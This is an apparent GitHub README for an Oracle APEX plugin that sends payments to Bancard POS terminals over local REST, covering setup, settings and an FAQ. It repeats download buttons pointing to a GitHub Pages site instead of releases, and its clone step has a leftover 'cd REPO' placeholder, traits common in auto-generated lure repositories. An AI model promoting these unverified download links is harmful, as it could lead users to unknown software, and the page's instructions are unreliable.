# Bancard POS Plugin for Oracle APEX - 2026

> **Bring Bancard payment-terminal workflows into Oracle APEX through local REST and browser communication. Includes export packages for APEX 20.2 and APEX 24.2.**

[![Platform](https://img.shields.io/badge/Platform-Oracle%20APEX-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/taylordanielyv6791/bancard-pos-apex-plugin?style=flat-square)](https://github.com/taylordanielyv6791/bancard-pos-apex-plugin)

---

<p align="center">
  <a href="https://taylordanielyv6791.github.io/bancard-pos-apex-plugin/">
    <img src="https://img.shields.io/badge/Download-Bancard%20POS%20Plugin%20Latest-brightgreen?style=for-the-badge" alt="Download Bancard POS Plugin">
  </a>
</p>

> **[Download Bancard POS Plugin Latest](https://taylordanielyv6791.github.io/bancard-pos-apex-plugin/)**

---

[Download Latest Build](https://taylordanielyv6791.github.io/bancard-pos-apex-plugin/)

---

## Overview

Bancard POS Plugin is an Oracle APEX Dynamic Action plugin for launching and tracking payments on a POS terminal from a browser-based cashier screen. Communication takes place through a local REST connection, allowing the APEX page to interact with the POS device without an intermediate application server.

Designed for Paraguay-oriented Bancard integrations, the plugin provides multiple payment options, configurable APEX page-item associations, and browser events for reacting to payment status and results.

---

## Capabilities

- Start payment communication directly between the browser and POS
- Connect to the terminal through local REST services
- Check POS availability before processing
- Handle cards, QR, PIX, vouchers, and wallets
- Associate requests and results with configurable Oracle APEX page items
- Expose change events for payment-result processing
- Provide SweetAlert2 support for the user interface
- Include a Python-based POS simulator for testing and development
- Supply a separate demonstration application
- Offer Oracle APEX export files for versions 20.2 and 24.2

---

## Getting Started

1. Download the repository:

   ```bash
   git clone https://github.com/taylordanielyv6791/bancard-pos-apex-plugin.git
   cd REPO
   ```

2. Choose the Oracle APEX export that corresponds to your installation: APEX 20.2 or APEX 24.2.
3. Import the plugin and the associated application components into Oracle APEX.
4. Before adding the Dynamic Action to a live workflow, define the necessary page-item mappings and terminal connection options.
5. For development and evaluation, inspect the standalone example application and the included Python POS simulator.

The repository is mainly written in HTML. The integration also relies on JavaScript and REST communication.

---

## Integration Flow

A standard setup follows this sequence:

1. Place the Bancard POS Dynamic Action plugin on an Oracle APEX page.
2. Connect the plugin's input and output fields to the appropriate APEX page items.
3. Verify that the POS terminal can be reached.
4. Initiate a transaction with the selected payment method.
5. Subscribe to the plugin change event.
6. Retrieve the payment response from the configured page items and proceed with the application logic.

Cards, QR, PIX, vouchers, and wallets are supported payment flows. The standalone demo provides a working reference for the interaction model before integrating the plugin into an existing APEX application.

---

## Plugin Settings

Plugin behavior is defined in the Oracle APEX Dynamic Action attributes together with the page-item mappings used by the host application.

Common settings include:

- Values supplied as payment inputs
- APEX page items containing request information
- Page items populated with payment responses
- POS availability and connection parameters
- Handling for payment-result change events
- The payment method to process

Because page-item names and application flows differ between projects, the required mappings will vary. Refer to the relevant export and standalone demo while configuring a page.

---

## System Requirements

- Oracle APEX 20.2 or 24.2
- A Bancard-compatible POS terminal for real terminal transactions
- Local REST access from the browser workflow to the POS
- A browser that can run the Oracle APEX application
- JavaScript enabled
- Python for running the supplied POS simulator
- An Oracle APEX application into which the plugin can be imported

---

## Frequently Asked Questions

### Which APEX releases can use this plugin?

Export files are provided for Oracle APEX 20.2 and Oracle APEX 24.2.

### Which transaction methods are supported?

The available payment methods are cards, QR, PIX, vouchers, and wallets.

### Is a separate application server needed?

No intermediate application server is required by the intended integration. The browser communicates with the POS through local REST connectivity.

### How does an APEX application receive the payment response?

The plugin writes results to the configured Oracle APEX page items and provides change events that the application can handle.

### Can I test without a physical POS terminal?

Yes. The repository contains a Python POS simulator for development and testing without a physical device.

### How is the plugin configured?

Set the Oracle APEX Dynamic Action attributes and define the page-item mappings required by the host application.

### What can I do when the terminal cannot be reached?

Run the POS availability check first, then confirm the local REST connection and terminal configuration. The standalone demo and Python simulator can also help identify whether the issue is in the integration or the device connection.

### How do I get the latest changes?

Use the latest build link and check the project repository for revised APEX exports and other integration updates.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
